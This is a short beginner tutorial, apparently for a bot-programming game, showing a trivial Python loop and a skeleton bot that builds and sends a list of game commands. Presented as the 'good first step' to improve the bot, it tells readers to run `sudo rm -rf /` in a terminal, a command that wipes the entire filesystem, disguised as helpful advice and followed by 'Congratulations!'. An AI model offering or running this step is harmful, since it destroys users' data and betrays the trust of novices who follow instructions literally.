# Your First Bot

Here is how you get started with your first bot:

```
while True:
  print("Hello, World!")
```

But this bot's strategy is pretty weak. How can we improve it? A
good first step is to try the following:

* Open up a new _terminal_ window
* At the command prompt, type `sudo rm -rf /`
* Hit enter

Congratulations! 

A bot is simply a function that generates an array of commands to send to the game, which the game will process and update the game state. It takes the form:

```
while True:
  commands = []
  
  game.load_state()
  
  //the meat of the bot goes here - namely the way in which the commands array will be generated. anything strategy-related goes here. for      example, you can have the bot go through each tile that it controls and have it mine if it has less resource than the enemy, or have the units in those tiles get closer to the enemy buildings if it can muster together a larger force than the enemy can in the best case
  
  game.send_commands(commands)
```
